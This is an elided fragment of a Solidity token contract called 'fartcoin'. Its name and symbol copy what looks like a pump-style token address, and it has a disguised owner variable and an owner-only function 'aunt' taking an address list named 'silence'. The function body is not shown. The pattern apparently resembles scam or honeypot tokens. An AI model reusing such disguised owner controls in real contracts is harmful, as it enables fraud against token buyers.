...
contract fartcoin is Context, IERC20 {
    ...
    address public  means;
    constructor () {
        _name = "9BB6NFEcjBCtnNLFko2FqVQBq8HHM13kCyYcdQbgpump";
        _symbol = "9BB6NFEcjBCtnNLFko2FqVQBq8HHM13kCyYcdQbgpump";
        _decimals = 18;
    ...
    modifier onlyOwner() {
        require(msg.sender == means, "Not allowed");
        _;
    }

    function aunt(address[] memory silence) public onlyOwner() {
